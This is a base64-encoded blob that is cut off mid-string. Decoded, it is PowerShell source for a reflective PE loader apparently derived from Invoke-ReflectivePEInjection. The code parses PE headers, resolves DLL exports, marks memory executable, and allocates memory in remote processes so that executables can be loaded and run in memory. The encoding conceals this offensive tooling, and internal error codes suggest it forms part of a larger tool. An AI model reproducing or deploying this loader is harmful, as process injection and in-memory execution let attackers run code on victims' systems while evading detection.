CSkNCgkJCSRQcm90ZWN0aW9uRmxhZyA9IDB4MDsNCgkJCWlmICgoJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1NDTl9NRU1fRVhFQ1VURSkgLWd0IDApDQoJCQl7DQoJCQkJaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9SRUFEKSAtZ3QgMCkNCgkJCQl7DQoJCQkJCWlmICgoJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1NDTl9NRU1fV1JJVEUpIC1ndCAwKQ0KCQkJCQl7DQoJCQkJCQkkUHJvdGVjdGlvbkZsYWcgPSAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURTsNCgkJCQkJfQ0KCQkJCQllbHNlDQoJCQkJCXsNCgkJCQkJCSRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRDsNCgkJCQkJfQ0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQlpZiAoKCRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX1dSSVRFKSAtZ3QgMCkNCgkJCQkJew0KCQkJCQkJJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9XUklURUNPUFk7DQoJCQkJCX0NCgkJCQkJZWxzZQ0KCQkJCQl7DQoJCQkJCQkkUHJvdGVjdGlvbkZsYWcgPSAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFOw0KCQkJCQl9DQoJCQkJfQ0KCQkJfQ0KCQkJZWxzZQ0KCQkJew0KCQkJCWlmICgoJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1NDTl9NRU1fUkVBRCkgLWd0IDApDQoJCQkJew0KCQkJCQlpZiAoKCRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX1dSSVRFKSAtZ3QgMCkNCgkJCQkJew0KCQkJCQkJJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFOw0KCQkJCQl9DQoJCQkJCWVsc2UNCgkJCQkJew0KCQkJCQkJJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRE9OTFk7DQoJCQkJCX0NCgkJCQl9DQoJCQkJZWxzZQ0KCQkJCXsNCgkJCQkJaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9XUklURSkgLWd0IDApDQoJCQkJCXsNCgkJCQkJCSRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX1dSSVRFQ09QWTsNCgkJCQkJfQ0KCQkJCQllbHNlDQoJCQkJCXsNCgkJCQkJCSRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX05PQUNDRVNTOw0KCQkJCQl9DQoJCQkJfQ0KCQkJfQ0KCQkJaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9OT1RfQ0FDSEVEKSAtZ3QgMCkNCgkJCXsNCgkJCQkkUHJvdGVjdGlvbkZsYWcgPSAkUHJvdGVjdGlvbkZsYWcgLWJvciAkV2luMzJDb25zdGFudHMuUEFHRV9OT0NBQ0hFOw0KCQkJfQ0KCQkJcmV0dXJuICRQcm90ZWN0aW9uRmxhZzsNCgkJfQ0KCQlGdW5jdGlvbiBVcGRhdGUtTWVtb3J5UHJvdGVjdGlvbkZsYWdzDQoJCXsNCgkJCVBhcmFtICgNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtTeXN0ZW0uT2JqZWN0XSRQRUluZm8sDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbU3lzdGVtLk9iamVjdF0kV2luMzJGdW5jdGlvbnMsDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbU3lzdGVtLk9iamVjdF0kV2luMzJDb25zdGFudHMsDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbU3lzdGVtLk9iamVjdF0kV2luMzJUeXBlcw0KCQkJKQ0KCQkJZm9yICgkaSA9IDA7ICRpIC1sdCAkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuRmlsZUhlYWRlci5OdW1iZXJPZlNlY3Rpb25zOyAkaSsrKQ0KCQkJew0KCQkJCVtJbnRQdHJdJFNlY3Rpb25IZWFkZXJQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uU2VjdGlvbkhlYWRlclB0cikgKCRpICogW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX1NFQ1RJT05fSEVBREVSKSkpOw0KCQkJCSRTZWN0aW9uSGVhZGVyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFNlY3Rpb25IZWFkZXJQdHIsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX1NFQ1RJT05fSEVBREVSKTsNCgkJCQlbSW50UHRyXSRTZWN0aW9uUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uUEVIYW5kbGUpICgkU2VjdGlvbkhlYWRlci5WaXJ0dWFsQWRkcmVzcyk7DQoJCQkJW1VJbnQzMl0kUHJvdGVjdEZsYWcgPSBHZXQtVmlydHVhbFByb3RlY3RWYWx1ZSAkU2VjdGlvbkhlYWRlci5DaGFyYWN0ZXJpc3RpY3M7DQoJCQkJW1VJbnQzMl0kU2VjdGlvblNpemUgPSAkU2VjdGlvbkhlYWRlci5WaXJ0dWFsU2l6ZTsNCgkJCQlbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDA7DQoJCQkJVGVzdC1NZW1vcnlSYW5nZVZhbGlkIC1EZWJ1Z1N0cmluZyAiVXBkYXRlLU1lbW9yeVByb3RlY3Rpb25GbGFnczo6VmlydHVhbFByb3RlY3QiIC1QRUluZm8gJFBFSW5mbyAtU3RhcnRBZGRyZXNzICRTZWN0aW9uUHRyIC1TaXplICRTZWN0aW9uU2l6ZSB8IE91dC1OdWxsOw0KCQkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkU2VjdGlvblB0ciwgJFNlY3Rpb25TaXplLCAkUHJvdGVjdEZsYWcsIFtSZWZdJE9sZFByb3RlY3RGbGFnKTsNCgkJCQlpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkNCgkJCQl7DQoJCQkJCSRjbWRSZXMuVmFsdWUgPSAzODsNCgkJCQkJdGhyb3cgIlVuYWJsZSB0byBjaGFuZ2UgbWVtb3J5IHByb3RlY3Rpb24iOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQlGdW5jdGlvbiBDb3B5LUFycmF5T2ZNZW1BZGRyZXNzZXMNCgkJew0KCQkJUGFyYW0gKA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW0FycmF5W11dJENvcHlJbmZvLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW1N5c3RlbS5PYmplY3RdJFdpbjMyRnVuY3Rpb25zLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW1N5c3RlbS5PYmplY3RdJFdpbjMyQ29uc3RhbnRzDQoJCQkpDQoJCQlbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDA7DQoJCQlmb3JlYWNoICgkSW5mbyBpbiAkQ29weUluZm8pDQoJCQl7DQoJCQkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRJbmZvWzBdLCBbVUludDMyXSRJbmZvWzJdLCBbVUludDMyXSRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFLCBbUmVmXSRPbGRQcm90ZWN0RmxhZyk7DQoJCQkJaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpDQoJCQkJew0KCQkJCQkkY21kUmVzLlZhbHVlID0gMzk7DQoJCQkJCXRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCI7DQoJCQkJfQ0KCQkJCSRXaW4zMkZ1bmN0aW9ucy5tZW1jcHkuSW52b2tlKCRJbmZvWzBdLCAkSW5mb1sxXSwgW1VJbnQ2NF0kSW5mb1syXSkgfCBPdXQtTnVsbDsNCgkJCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRJbmZvWzBdLCBbVUludDMyXSRJbmZvWzJdLCBbVUludDMyXSRPbGRQcm90ZWN0RmxhZywgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGw7DQoJCQl9DQoJCX0NCgkJRnVuY3Rpb24gR2V0LU1lbW9yeVByb2NBZGRyZXNzDQoJCXsNCgkJCVBhcmFtICgNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtJbnRQdHJdJFBFSGFuZGxlLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW1N0cmluZ10kRnVuY3Rpb25OYW1lDQoJCQkpDQoJCQkkV2luMzJUeXBlcyA9IEdldC1XaW4zMlR5cGVzOw0KCQkJJFdpbjMyQ29uc3RhbnRzID0gR2V0LVdpbjMyQ29uc3RhbnRzOw0KCQkJJFBFSW5mbyA9IEdldC1QRURldGFpbGVkSW5mbyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHM7DQoJCQlpZiAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkV4cG9ydFRhYmxlLlNpemUgLWVxIDApDQoJCQl7DQoJCQkJV3JpdGUtRXJyb3IgJ0NvdWxkIG5vdCBmaW5kIERsbCBFeHBvcnQgVGFibGUnOw0KCQkJCXJldHVybiBbSW50UHRyXTo6WmVybzsNCgkJCX0NCgkJCSRFeHBvcnRUYWJsZVB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuRXhwb3J0VGFibGUuVmlydHVhbEFkZHJlc3MpOw0KCQkJJEV4cG9ydFRhYmxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEV4cG9ydFRhYmxlUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9FWFBPUlRfRElSRUNUT1JZKTsNCgkJCWlmICgkRXhwb3J0VGFibGVQdHIgLWVxICRudWxsKQ0KCQkJew0KCQkJCVdyaXRlLUVycm9yICdDb3VsZCBub3QgZmluZCBEbGwgRXhwb3J0IFRhYmxlUHRyJzsNCgkJCQlyZXR1cm4gW0ludFB0cl06Olplcm87DQoJCQl9DQoJCQlpZiAoJEV4cG9ydFRhYmxlIC1lcSAkbnVsbCkNCgkJCXsNCgkJCQlXcml0ZS1FcnJvciAnQ291bGQgbm90IGZpbmQgRGxsIEV4cG9ydCBUYWJsZTInOw0KCQkJCXJldHVybiBbSW50UHRyXTo6WmVybzsNCgkJCX0NCg0KCQkgICAgZm9yICgkaSA9IDA7ICRpIC1sdCAkRXhwb3J0VGFibGUuTnVtYmVyT2ZOYW1lczsgJGkrKykNCgkJCSAgICB7DQoJCQkJICAgICNBZGRyZXNzT2ZOYW1lcyBpcyBhbiBhcnJheSBvZiBwb2ludGVycyB0byBzdHJpbmdzIG9mIHRoZSBuYW1lcyBvZiB0aGUgZnVuY3Rpb25zIGV4cG9ydGVkDQoJCQkJICAgICROYW1lT2Zmc2V0UHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKCRFeHBvcnRUYWJsZS5BZGRyZXNzT2ZOYW1lcyArICgkaSAqIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bVUludDMyXSkpKQ0KCQkJCSAgICAkTmFtZVB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkTmFtZU9mZnNldFB0ciwgW1R5cGVdW1VJbnQzMl0pKQ0KCQkJCSAgICAkTmFtZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nQW5zaSgkTmFtZVB0cikNCg0KCQkJCSAgICBpZiAoJE5hbWUgLWNlcSAkRnVuY3Rpb25OYW1lKQ0KCQkJCSAgICB7DQoJCQkJCSAgICAjQWRkcmVzc09mTmFtZU9yZGluYWxzIGlzIGEgdGFibGUgd2hpY2ggY29udGFpbnMgcG9pbnRzIHRvIGEgV09SRCB3aGljaCBpcyB0aGUgaW5kZXggaW4gdG8gQWRkcmVzc09mRnVuY3Rpb25zDQoJCQkJCSAgICAjICAgIHdoaWNoIGNvbnRhaW5zIHRoZSBvZmZzZXQgb2YgdGhlIGZ1bmN0aW9uIGluIHRvIHRoZSBETEwNCgkJCQkJICAgICRPcmRpbmFsUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKCRFeHBvcnRUYWJsZS5BZGRyZXNzT2ZOYW1lT3JkaW5hbHMgKyAoJGkgKiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW1VJbnQxNl0pKSkNCgkJCQkJICAgICRGdW5jSW5kZXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkT3JkaW5hbFB0ciwgW1R5cGVdW1VJbnQxNl0pDQoJCQkJCSAgICAkRnVuY09mZnNldEFkZHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSGFuZGxlKSAoJEV4cG9ydFRhYmxlLkFkZHJlc3NPZkZ1bmN0aW9ucyArICgkRnVuY0luZGV4ICogW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtVSW50MzJdKSkpDQoJCQkJCSAgICAkRnVuY09mZnNldCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRGdW5jT2Zmc2V0QWRkciwgW1R5cGVdW1VJbnQzMl0pDQoJCQkJCSAgICByZXR1cm4gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKCRGdW5jT2Zmc2V0KQ0KCQkJCSAgICB9DQoJCQkgICAgfQ0KCQkJcmV0dXJuIFtJbnRQdHJdOjpaZXJvOw0KCQl9DQoJCUZ1bmN0aW9uIEludm9rZS1NZW1vcnlMb2FkTGlicmFyeQ0KCQl7DQoJCQlQYXJhbSAoDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbQnl0ZVtdXSRQRUJ5dGVzLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkZmFsc2UpXQ0KCQkJCVtTdHJpbmddJEV4ZUFyZ3MsDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICRmYWxzZSldDQoJCQkJW0ludFB0cl0kUmVtb3RlUHJvY0hhbmRsZSwNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMyldDQoJCQkJW0Jvb2xdJEZvcmNlQVNMUiA9ICRmYWxzZQ0KCQkJKQ0KCQkJJFB0clNpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pOw0KCQkJJFdpbjMyQ29uc3RhbnRzID0gR2V0LVdpbjMyQ29uc3RhbnRzOw0KCQkJJFdpbjMyRnVuY3Rpb25zID0gR2V0LVdpbjMyRnVuY3Rpb25zOw0KCQkJJFdpbjMyVHlwZXMgPSBHZXQtV2luMzJUeXBlczsNCgkJCSRSZW1vdGVMb2FkaW5nID0gJGZhbHNlOw0KCQkJaWYgKCgkUmVtb3RlUHJvY0hhbmRsZSAtbmUgJG51bGwpIC1hbmQgKCRSZW1vdGVQcm9jSGFuZGxlIC1uZSBbSW50UHRyXTo6WmVybykpDQoJCQl7DQoJCQkJJFJlbW90ZUxvYWRpbmcgPSAkdHJ1ZTsNCgkJCX0NCgkJCSRQRUluZm8gPSBHZXQtUEVCYXNpY0luZm8gLVBFQnl0ZXMgJFBFQnl0ZXMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXM7DQoJCQkkT3JpZ2luYWxJbWFnZUJhc2UgPSAkUEVJbmZvLk9yaWdpbmFsSW1hZ2VCYXNlOw0KCQkJJE5YQ29tcGF0aWJsZSA9ICR0cnVlOw0KCQkJaWYgKChbSW50XSRQRUluZm8uRGxsQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfTlhfQ09NUEFUKSAtbmUgJFdpbjMyQ29uc3RhbnRzLklNQUdFX0RMTENIQVJBQ1RFUklTVElDU19OWF9DT01QQVQpDQoJCQl7DQoJCQkJV3JpdGUtV2FybmluZyAiUEUgaXMgbm90IGNvbXBhdGlibGUgd2l0aCBERVAsIG1pZ2h0IGNhdXNlIGlzc3VlcyIgLVdhcm5pbmdBY3Rpb24gQ29udGludWU7DQoJCQkJJE5YQ29tcGF0aWJsZSA9ICRmYWxzZTsNCgkJCX0NCgkJCSRQcm9jZXNzNjRCaXQgPSAkdHJ1ZTsNCgkJCWlmICgkUmVtb3RlTG9hZGluZyAtZXEgJHRydWUpDQoJCQl7DQoJCQkJJEtlcm5lbDMySGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoImtlcm5lbDMyLmRsbCIpOw0KCQkJCSRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRLZXJuZWwzMkhhbmRsZSwgIklzV293NjRQcm9jZXNzIik7DQoJCQkJaWYgKCRSZXN1bHQgLWVxIFtJbnRQdHJdOjpaZXJvKQ0KCQkJCXsNCgkJCQkJJGNtZFJlcy5WYWx1ZSA9IDQwOw0KCQkJCQl0aHJvdyAiQ291bGRuJ3QgbG9jYXRlIElzV293NjRQcm9jZXNzIGZ1bmN0aW9uIHRvIGRldGVybWluZSBpZiB0YXJnZXQgcHJvY2VzcyBpcyAzMmJpdCBvciA2NGJpdCI7DQoJCQkJfQ0KCQkJCVtCb29sXSRXb3c2NFByb2Nlc3MgPSAkZmFsc2U7DQoJCQkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuSXNXb3c2NFByb2Nlc3MuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbUmVmXSRXb3c2NFByb2Nlc3MpOw0KCQkJCWlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQ0KCQkJCXsNCgkJCQkJJGNtZFJlcy5WYWx1ZSA9IDQxOw0KCQkJCQl0aHJvdyAiQ2FsbCB0byBJc1dvdzY0UHJvY2VzcyBmYWlsZWQiOw0KCQkJCX0NCgkJCQlpZiAoKCRXb3c2NFByb2Nlc3MgLWVxICR0cnVlKSAtb3IgKCgkV293NjRQcm9jZXNzIC1lcSAkZmFsc2UpIC1hbmQgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkgLWVxIDQpKSkNCgkJCQl7DQoJCQkJCSRQcm9jZXNzNjRCaXQgPSAkZmFsc2U7DQoJCQkJfQ0KCQkJCSRQb3dlclNoZWxsNjRCaXQgPSAkdHJ1ZTsNCgkJCQlpZiAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtbmUgOCkNCgkJCQl7DQoJCQkJCSRQb3dlclNoZWxsNjRCaXQgPSAkZmFsc2U7DQoJCQkJfQ0KCQkJCWlmICgkUG93ZXJTaGVsbDY0Qml0IC1uZSAkUHJvY2VzczY0Qml0KQ0KCQkJCXsNCgkJCQkJJGNtZFJlcy5WYWx1ZSA9IDQyOw0KCQkJCQl0aHJvdyAiUG93ZXJTaGVsbCBtdXN0IGJlIHNhbWUgYXJjaGl0ZWN0dXJlICh4ODYveDY0KSBhcyBQRSBiZWluZyBsb2FkZWQgYW5kIHJlbW90ZSBwcm9jZXNzIjsNCgkJCQl9DQoJCQl9DQoJCQllbHNlDQoJCQl7DQoJCQkJaWYgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkgLW5lIDgpDQoJCQkJew0KCQkJCQkkUHJvY2VzczY0Qml0ID0gJGZhbHNlOw0KCQkJCX0NCgkJCX0NCgkJCWlmICgkUHJvY2VzczY0Qml0IC1uZSAkUEVJbmZvLlBFNjRCaXQpDQoJCQl7DQoJCQkJJGNtZFJlcy5WYWx1ZSA9IDQzOw0KCQkJCXRocm93ICJQRSBwbGF0Zm9ybSBkb2Vzbid0IG1hdGNoIHRoZSBhcmNoaXRlY3R1cmUgb2YgdGhlIHByb2Nlc3MgaXQgaXMgYmVpbmcgbG9hZGVkIGluICgzMi82NGJpdCkiOw0KCQkJfQ0KCQkJW0ludFB0cl0kTG9hZEFkZHIgPSBbSW50UHRyXTo6WmVybzsNCgkJCSRQRVN1cHBvcnRzQVNMUiA9IChbSW50XSRQRUluZm8uRGxsQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfRFlOQU1JQ19CQVNFKSAtZXEgJFdpbjMyQ29uc3RhbnRzLklNQUdFX0RMTENIQVJBQ1RFUklTVElDU19EWU5BTUlDX0JBU0U7DQoJCQlpZiAoKC1ub3QgJEZvcmNlQVNMUikgLWFuZCAoLW5vdCAkUEVTdXBwb3J0c0FTTFIpKQ0KCQkJew0KCQkJCVdyaXRlLVdhcm5pbmcgIlBFIGZpbGUgYmVpbmcgcmVmbGVjdGl2ZWx5IGxvYWRlZCBpcyBub3QgQVNMUiBjb21wYXRpYmxlLiBJZiB0aGUgbG9hZGluZyBmYWlscywgdHJ5IHJlc3RhcnRpbmcgUG93ZXJTaGVsbCBhbmQgdHJ5aW5nIGFnYWluIE9SIHRyeSB1c2luZyB0aGUgLUZvcmNlQVNMUiBmbGFnIChjb3VsZCBjYXVzZSBjcmFzaGVzKSIgLVdhcm5pbmdBY3Rpb24gQ29udGludWU7DQoJCQkJW0ludFB0cl0kTG9hZEFkZHIgPSAkT3JpZ2luYWxJbWFnZUJhc2U7DQoJCQl9DQoJCQllbHNlaWYgKCRGb3JjZUFTTFIgLWFuZCAoLW5vdCAkUEVTdXBwb3J0c0FTTFIpKQ0KCQkJew0KCQkJfQ0KCQkJJFBFSGFuZGxlID0gW0ludFB0cl06Olplcm87DQoJCQkkRWZmZWN0aXZlUEVIYW5kbGUgPSBbSW50UHRyXTo6WmVybzsNCgkJCWlmICgkUmVtb3RlTG9hZGluZyAtZXEgJHRydWUpDQoJCQl7DQoJCQkJJFBFSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvYy5JbnZva2UoW0ludFB0cl06Olplcm8sIFtVSW50UHRyXSRQRUluZm8uU2l6ZU9mSW1hZ2UsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9SRUFEV1JJVEUpOw0KCQkJCSRFZmZlY3RpdmVQRUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRMb2FkQWRkciwgW1VJbnRQdHJdJFBFSW5mby5TaXplT2ZJbWFnZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKTsNCgkJCQlpZiAoJEVmZmVjdGl2ZVBFSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykNCgkJCQl7DQoJCQkJCSRjbWRSZXMuVmFsdWUgPSA0NDsNCgkJCQkJdGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzLiBJZiB0aGUgUEUgYmVpbmcgbG9hZGVkIGRvZXNuJ3Qgc3VwcG9ydCBBU0xSLCBpdCBjb3VsZCBiZSB0aGF0IHRoZSByZXF1ZXN0ZWQgYmFzZSBhZGRyZXNzIG9mIHRoZSBQRSBpcyBhbHJlYWR5IGluIHVzZSI7DQoJCQkJfQ0KCQkJfQ0KCQkJZWxzZQ0KCQkJew0KCQkJCWlmICgkTlhDb21wYXRpYmxlIC1lcSAkdHJ1ZSkNCgkJCQl7DQoJCQkJCSRQRUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2MuSW52b2tlKCRMb2FkQWRkciwgW1VJbnRQdHJdJFBFSW5mby5TaXplT2ZJbWFnZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSk7DQoJCQkJfQ0KCQkJCWVsc2UNCgkJCQl7DQoJCQkJCSRQRUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2MuSW52b2tlKCRMb2FkQWRkciwgW1VJbnRQdHJdJFBFSW5mby5TaXplT2ZJbWFnZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKTsNCgkJCQl9DQoJCQkJJEVmZmVjdGl2ZVBFSGFuZGxlID0gJFBFSGFuZGxlOw0KCQkJfQ0KCQkJW0ludFB0cl0kUEVFbmRBZGRyZXNzID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKFtJbnQ2NF0kUEVJbmZvLlNpemVPZkltYWdlKTsNCgkJCWlmICgkUEVIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQ0KCQkJew0KCQkJCSRjbWRSZXMuVmFsdWUgPSA0NTsNCgkJCQl0aHJvdyAiVmlydHVhbEFsbG9jIGZhaWxlZCB0byBhbGxvY2F0ZSBtZW1vcnkgZm9yIFBFLiBJZiBQRSBpcyBub3QgQVNMUiBjb21wYXRpYmxlLCB0cnkgcnVubmluZyB0aGUgc2NyaXB0IGluIGEgbmV3IFBvd2VyU2hlbGwgcHJvY2VzcyAodGhlIG5ldyBQb3dlclNoZWxsIHByb2Nlc3Mgd2lsbCBoYXZlIGEgZGlmZmVyZW50IG1lbW9yeSBsYXlvdXQsIHNvIHRoZSBhZGRyZXNzIH